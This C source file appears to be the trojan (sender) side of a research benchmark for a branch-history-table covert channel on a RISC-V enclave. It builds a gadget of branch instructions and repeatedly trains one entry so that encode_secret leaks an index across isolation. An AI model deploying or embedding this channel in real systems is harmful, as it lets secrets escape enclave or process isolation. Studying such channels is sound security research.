#include "eapp_trojan.h"
#include "chipsupport.h"

bht_work_area area;

int entries = 64;
WORD passes = 1 << BHT_COUNTER_BITS;

unsigned int encode_branch_offset(unsigned int offset) {
    offset <<= 2;
    unsigned int final = (offset >> 4) & 0x80; // 1 bit mask
    final |= (offset << 7) & 0xF00; // 4 bit mask
    final |= (offset << 20) & 0x7E000000; // 6 bit mask
    final |= (offset << 21) & 0x80000000; // 1 bit mask
    return final;
}

// the gadget is an array of "blt a0, a1, [gadget_end]" (size = BHT_ENTRIES), terminating with a ret
// if we execute one instruction, it will be the only branch to be taken if the condition is met, or all successive branches will be taken if not met.
void initialise_benchmark() {
    //write ret at the end
    area.entries[BHT_ENTRIES] = RET_OPCODE;
    uint32_t off0_val = BLT01_OPCODE;

    for(uint32_t i = 0; i < BHT_ENTRIES; i++) {
        uint32_t offset = &area.entries[BHT_ENTRIES] - &area.entries[i];
        // offset <<= 2;
        
        area.entries[i] = off0_val | encode_branch_offset(offset);
    }
}

void touch_taken_bht(WORD i) {
    sig_br* touch_branch = (sig_br*) (&area.entries[i]);
    touch_branch(1, 2);
}

void encode_secret(int i) {
  for(WORD j = 0; j < passes; j++) {
        touch_taken_bht(i);
    }
}

int get_number_of_entries() {
    return entries;
}